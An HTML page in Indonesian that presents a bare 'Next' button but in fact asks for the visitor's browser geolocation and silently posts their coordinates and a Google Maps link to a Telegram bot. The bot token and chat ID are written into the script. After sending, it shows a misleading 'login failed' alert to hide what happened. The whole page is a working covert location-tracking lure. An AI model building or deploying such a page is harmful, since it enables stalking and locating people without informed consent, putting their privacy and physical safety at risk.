<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Gatau apaaa</title>
</head>
<body>
  <h2>Haiiii Klik Next Dibawah</h2>
  <button onclick="getLocation()">>>>>Next<<<<<<</button>

  <script>
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendToTelegram, showError);
      } else {
        alert("Browser tidak mendukung geolokasi.");
      }
    }

    function sendToTelegram(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const token = '7964139428:AAGnsuwbOsfVNsQGW6H3jfUtPQbxpjzreHQ';  // Ganti dengan token bot kamu
      const chat_id = '7207645033';  // Ganti dengan chat ID kamu

      const text = `📍 Lokasi Saat Ini:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://maps.google.com/?q=${lat},${lon}`;
      const url = `https://api.telegram.org/bot${token}/sendMessage`;

      fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chat_id,
          text: text
        })
      })
      .then(response => {
        if (response.ok) {
          alert("Gagal Masukk");
        } else {
          alert("Gagal Masukkk");
        }
      });
    }

    function showError(error) {
      switch(error.code) {
        case error.PERMISSION_DENIED:
          alert("Izin lokasi ditolak.");
          break;
        case error.POSITION_UNAVAILABLE:
          alert("Informasi lokasi tidak tersedia.");
          break;
        case error.TIMEOUT:
          alert("Permintaan lokasi terlalu lama.");
          break;
        default:
          alert("Terjadi kesalahan saat mengambil lokasi.");
          break;
      }
    }
  </script>
</body>
  </html>
